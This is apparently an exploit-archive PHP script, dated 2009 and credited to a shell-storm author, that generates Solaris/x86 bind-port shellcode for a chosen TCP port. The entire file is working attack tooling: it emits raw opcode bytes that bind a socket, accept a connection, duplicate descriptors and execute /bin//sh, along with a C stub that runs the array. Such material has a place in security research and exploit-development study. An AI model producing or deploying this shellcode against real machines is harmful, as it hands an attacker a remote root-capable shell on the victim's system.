<?php
/*
Utility	: Solaris/x86 - Generate PortBind/TCP shellcode
Author	: Jonathan Salwan
Mail	: submit [!] shell-storm.org

	More shellcodes in => http://www.shell-storm.org/shellcode/
*/

function syntax()
	{
	echo "\nSyntax:\nroot@laptop:/# php ./payload.php <port>\n\n";
	}

function win32bind($port)
		{
		if($port > 65535 || $port < 4100){
			echo "Erreur Port\nSelect a port between 4100 and 65535\n";
			return false;
			}

		$inser .= "\nchar shellcode[] = \n";
		$inser .= "			/* BindPort TCP/$port; Os:Solaris; Gen:http://payload.shell-storm.org */\n";
		$inser .= "\n";

		$inser .= "			\x22\\xb8\\xff\\xf8\\xff\\x3c\\xf7\\xd0\\x50\\x31\\xc0\\xb0\\x9a\\x50\\x89\\xe5\\x31\\xc9\x22\n";
		$inser .= "			\x22\\x51\\x41\\x41\\x51\\x51\\xb0\\xe6\\xff\\xd5\\x31\\xd2\\x89\\xc7\\x52\\x66\\x68\x22\n";
		$inser .= "			\x22\\x";

		$res_port 	= base_convert($port, 10, 16);

		$length 	= strlen($res_port)-1;
		$i 		= 1;

		for($idx = 0; $idx < $length+1; $idx++)
		{
		$i++;
		if($i == 4)
		$inser .= "\\x";

		$inser .= $res_port[$idx];
		}
		$inser .= "\x22 /* Port ".$port." */\n";
		$inser .= "			\x22\\x66\\x51\\x89\\xe6\\x6a\\x10\\x56\\x57\\xb0\\xe8\\xff\\xd5\\xb0\\xe9\\xff\\xd5\x22\n";
		$inser .= "			\x22\\x50\\x50\\x57\\xb0\\xea\\xff\\xd5\\x31\\xd2\\xb2\\x09\\x51\\x52\\x50\\xb0\\x3e\x22\n";
		$inser .= "			\x22\\xff\\xd5\\x49\\x79\\xf2\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\x22\n";
		$inser .= "			\x22\\x89\\xe3\\x50\\x53\\x89\\xe2\\x50\\x52\\x53\\xb0\\x3b\\xff\\xd5\x22\x3b\n";
		$inser .= "\n";
		$inser .= "	printf(\x22Length: %d\\n\x22,strlen(shellcode));\n";
		$inser .= "	(*(void(*)()) shellcode)();</br>";
		$inser .= "\n";
		$inser .= "\n";

	return $inser;
}

if($argc < 2){
	syntax();
	return false;
	}
		$port = $argv[1];
		echo win32bind($port);

?>

# milw0rm.com [2009-06-16]